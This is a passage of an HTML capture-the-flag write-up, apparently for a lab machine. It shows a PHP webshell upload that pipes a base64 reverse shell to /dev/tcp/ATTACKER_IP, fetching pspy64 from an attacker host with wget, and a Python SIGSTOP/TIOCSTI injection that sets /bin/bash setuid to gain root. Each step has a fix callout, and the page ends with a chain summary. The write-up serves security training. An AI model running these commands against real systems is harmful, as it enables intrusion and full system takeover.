+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+echo -n 'bash -i &gt;&amp; /dev/tcp/<span class="ca">ATTACKER_IP</span>/4444 0&gt;&amp;1' | base64
+<span class="ck"># URL-encode the + and = chars in the b64 output as %2B, %3D</span>
+
+nc -lvnp 4444
+
+curl 'http://127.0.0.1:9999/shell.png.php?cmd=echo%20&lt;b64&gt;%7Cbase64%20-d%7Cbash'</code></pre>
+    <pre><code><div class="ph"><span class="pl">shell — confirmation</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+id
+<span class="cg">uid=1003(orville) gid=1003(orville) groups=1003(orville)</span></code></pre>
+    <p>Stabilise the TTY again the same way as before. Second flag.</p>
+    <div class="callout red"><strong>Root cause / fix:</strong> Two separate failures: (1) the upload handler validates extension client-side or only checks the first dot, allowing double extensions; (2) the filename parameter is used unsanitised as a filesystem path, allowing traversal out of the upload directory. Fix: generate the server-side filename (UUID + validated extension), never trust the client-supplied name for anything, and ensure the upload directory is under a separate vhost or with an explicit <code>php_flag engine off</code> in htaccess — not as a security control but as defence in depth.</div>
+    <p><strong>Portable lesson:</strong> If uploads land in a directory where PHP is disabled, your first instinct should be path traversal to reach an executable path. The filter and the execution restriction are two separate controls and defeating one doesn't automatically defeat the other.</p>
+  </section>
+
+  <!-- ── 08 PRIVESC 3 ── -->
+  <section class="section" id="privesc3">
+    <div class="s-num">08</div>
+    <h2>Privesc 3: <code>orville → root</code> — TTY Pushback via <code>TIOCSTI</code></h2>
+    <h3>Discovery</h3>
+    <p>Orville's home has a <code>web_snapshot.zip</code> regenerated on a schedule. No user crontab, nothing in <code>/etc/cron.*</code>. When cron doesn't explain a recurring job, watch the process table live. Drop <code>pspy64</code> to the box (small HTTP server on your attacker machine + <code>wget</code> on target, or <code>scp</code> with wilbur's SSH creds):</p>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="ck"># attacker side</span>
+python3 -m http.server 8000
+
+<span class="ck"># on target as orville</span>
+wget http://<span class="ca">ATTACKER_IP</span>:8000/pspy64 -O /tmp/pspy64
+chmod +x /tmp/pspy64
+/tmp/pspy64</code></pre>
+    <div class="shot">
+      <div class="sh"><span class="sl">terminal — pspy64</span><span class="ss">root process activity</span></div>
+      <img src="backtrack-pspy.png" alt="pspy64 output showing UID=0 process running su - orville followed by zip command" loading="lazy" />
+      <div class="sc">pspy catches it: root (UID=0) runs <code>su - orville</code>, then a zip of the web root executes as orville. Root periodically becomes orville to take the snapshot.</div>
+    </div>
+    <h3>Why <code>su -</code> is the opening</h3>
+    <p>The dash flag makes it a full login shell. That means root's <code>su - orville</code> executes orville's startup scripts — including <code>.bashrc</code>. And orville owns <code>.bashrc</code>. So I can make the root-initiated process run arbitrary code at switch time.</p>
+    <p>The catch: by the time <code>.bashrc</code> is read, privilege has already dropped. The process tree after the switch looks like this:</p>
+    <pre><code><div class="ph"><span class="pl">process tree</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+root shell (parent, uid 0)
+  └── su - orville
+       └── orville shell (child, uid 1003)  <span class="ck">← .bashrc runs here</span></code></pre>
+    <p>Running <code>chmod +s /bin/bash</code> directly in <code>.bashrc</code> just runs it as <code>orville</code> — useless. A plain <code>exit</code> kills the child and tears down the snapshot job without gaining anything. The privilege is sitting in the <em>parent</em> process, one level up. The question is how to get code to run there.</p>
+    <h3>SIGSTOP + TIOCSTI</h3>
+    <p>This is one of the oldest privesc vectors in Unix. The mechanism is two steps:</p>
+    <p><strong>Step 1 — SIGSTOP the parent.</strong> Send <code>SIGSTOP</code> to the parent process (the root shell). This freezes it — crucially, it doesn't kill it. Because the foreground process stopped, the controlling TTY hands input focus back to whoever is now in the foreground — which means the TTY is now listening as though root typed something.</p>
+    <p><strong>Step 2 — TIOCSTI injection.</strong> Use the <code>TIOCSTI</code> ioctl ("simulate terminal input") to inject characters into the TTY's input buffer, one byte at a time. Each byte looks indistinguishable from a real keystroke. The trailing <code>\n</code> submits the line. Since focus is back on the root context, the <strong>root shell</strong> reads those characters as its own input and executes them. Privilege here comes from the process <em>reading</em> the terminal — root's shell — not from the process calling the ioctl, which is still orville.</p>
+    <pre><code><div class="ph"><span class="pl">python — /dev/shm/backtoroot.py</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+#!/usr/bin/env python3
+import fcntl, termios, os, signal
+
+os.kill(os.getppid(), signal.SIGSTOP)
+
+for char in 'chmod +s /bin/bash\n':
+    fcntl.ioctl(0, termios.TIOCSTI, char)</code></pre>
+    <p>Place it in <code>/dev/shm/</code> — tmpfs, world-writable, doesn't touch the physical disk. Wire it into orville's <code>.bashrc</code>:</p>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+echo 'python3 /dev/shm/backtoroot.py' >> /home/orville/.bashrc</code></pre>
+    <p>Wait for the scheduled job to run. When root does <code>su - orville</code>, <code>.bashrc</code> fires the script, the script stops root's shell and injects <code>chmod +s /bin/bash</code> into it. After a moment:</p>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+ls -la /bin/bash
+<span class="cg">-rwsr-xr-x 1 root root ... /bin/bash</span>
+
+bash -p
+id
+<span class="cg">uid=1003(orville) gid=1003(orville) euid=0(root) groups=1003(orville)</span></code></pre>
+    <p><code>bash -p</code> is the privilege-preserving flag. When bash detects that its effective UID differs from its real UID (which is exactly what the SUID bit causes), it normally drops back to the real UID as a safety measure. <code>-p</code> disables that safety and keeps the elevated <code>euid=0</code>. Root.</p>
+    <div class="callout yellow"><strong>Kernel version matters here.</strong> <code>TIOCSTI</code> has leaked privileges across shared TTYs since ancient Unix. From Linux 6.2 it can be disabled via the <code>dev.tty.legacy_tiocsti</code> sysctl, and many modern distros ship it off by default. This box runs Ubuntu 20.04 / kernel 5.4.0, where it's fully available. On a current system you'd be looking at <code>TIOCLINUX</code> or other pushback paths instead.</div>
+    <div class="callout red"><strong>Root cause / fix:</strong> The real bug isn't <code>TIOCSTI</code> — it's that root runs <code>su -</code> into a user whose <code>.bashrc</code> that user controls, over an interactive TTY. Correct pattern: use <code>su -s /bin/sh -c 'command'</code> with a hardcoded shell and no login scripts, or <code>runuser -l</code> with a clean, non-interactive environment. Never enter another user's writable login environment as root. A privileged process reading a user-writable startup script over a shared TTY is a TTY pushback waiting to happen.</div>
+    <p><strong>Portable lesson:</strong> When pspy shows root doing <code>su - someuser</code> where <code>someuser</code> is your current user, and you control their home directory, SIGSTOP + TIOCSTI is the standard technique. The pattern is memorable: stop the parent, steal its terminal.</p>
+  </section>
+
+  <!-- ── 09 CHAIN SUMMARY ── -->
+  <section class="section" id="chain">
+    <div class="s-num">09</div>
+    <h2>Chain Summary</h2>
+    <p>Four completely different bug classes, each one only reachable because the previous step gave up the exact piece of information the next one needed.</p>
+    <div class="chain">
+      <div class="chain-row">
+        <span class="chain-arrow">01</span>
+        <span class="chain-bug">8888 path traversal (--path-as-is)</span>
+        <span class="chain-gives">reads /etc/passwd → confirms Tomcat at /opt/tomcat, lists real users</span>
+      </div>
+      <div class="chain-row">
+        <span class="chain-arrow">02</span>
+        <span class="chain-bug">traversal → tomcat-users.xml</span>
+        <span class="chain-gives">plaintext manager credentials from a different service entirely</span>
+      </div>
+      <div class="chain-row">
+        <span class="chain-arrow">03</span>
+        <span class="chain-bug">manager /text/deploy WAR</span>
+        <span class="chain-gives">JSP reverse shell → foothold as tomcat</span>
+      </div>
+      <div class="chain-row">
+        <span class="chain-arrow">04</span>
+        <span class="chain-bug">sudo wildcard + ../ traversal</span>
+        <span class="chain-gives">ansible-playbook runs /tmp payload as wilbur</span>
+      </div>
+      <div class="chain-row">
+        <span class="chain-arrow">05</span>
+        <span class="chain-bug">wilbur home loot</span>
+        <span class="chain-gives">orville's gallery creds + discovery of internal :80</span>
+      </div>
+      <div class="chain-row">
+        <span class="chain-arrow">06</span>
+        <span class="chain-bug">SSH -L tunnel + .png.php + ../ upload</span>
+        <span class="chain-gives">PHP webshell in web root → RCE as orville</span>
+      </div>
+      <div class="chain-row">
+        <span class="chain-arrow">07</span>
+        <span class="chain-bug">pspy64 → su - orville over TTY</span>
+        <span class="chain-gives">SIGSTOP + TIOCSTI pushback → chmod +s /bin/bash as root</span>
+      </div>
+    </div>
+    <div class="steps">
+      <div class="step"><div class="sn">T1</div><div class="sb"><strong>Cross-service information disclosure is the highest-yield finding in a multi-app environment.</strong> One vulnerable static server reading the filesystem gave up credentials for an entirely unrelated Java application manager.</div></div>
+      <div class="step"><div class="sn">T2</div><div class="sb"><strong>When the GUI rejects you, test the API endpoint separately.</strong> <code>/manager/html</code> and <code>/manager/text/</code> can have different valve configurations. The text API is where automation scripts authenticate — it's often less locked-down.</div></div>
+      <div class="step"><div class="sn">T3</div><div class="sb"><strong>Wildcards in sudo path arguments are almost always bypassable.</strong> <code>fnmatch</code> without <code>FNM_PATHNAME</code> matches <code>/</code>, making the "safe directory" restriction meaningless. Enumerate specific files or wrap calls in a validator that canonicalises with <code>realpath</code>.</div></div>
+      <div class="step"><div class="sn">T4</div><div class="sb"><strong>An upload directory with PHP disabled is not the end of the upload bypass story.</strong> If <code>../</code> in the filename field isn't filtered, you can escape the restricted directory entirely. Two independent controls must both hold.</div></div>
+      <div class="step"><div class="sn">T5</div><div class="sb"><strong>When pspy shows root doing <code>su - youruser</code>, check if you control their <code>.bashrc</code>.</strong> SIGSTOP + TIOCSTI is the standard technique. The privilege comes from the process <em>reading</em> the terminal, not the one writing to it.</div></div>
+    </div>
+  </section>
+
+</main>
+
+<aside class="toc">
+  <div class="toc-label">Contents</div>
+  <ul>
+    <li><a href="#recon">01 — Recon</a></li>
+    <li><a href="#traversal">02 — Path Traversal</a></li>
+    <li><a href="#foothold">03 — WAR Foothold</a></li>
+    <li><a href="#privesc1">04 — tomcat → wilbur</a></li>
+    <li><a href="#loot">05 — Loot</a></li>
+    <li><a href="#tunnel">06 — SSH Tunnel</a></li>
+    <li><a href="#privesc2">07 — wilbur → orville</a></li>
+    <li><a href="#privesc3">08 — orville → root</a></li>
+    <li><a href="#chain">09 — Chain Summary</a></li>
+  </ul>
+</aside>
+</div>
+
+<footer>
+  <div class="footer-inner">
+    <span class="footer-copy">© 2025 Maks Huseynli</span>
+    <div class="footer-links">
+      <a href="../index.html">Home</a>
+      <a href="../methodology.html">Methodology</a>
+      <a href="../about.html">About</a>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
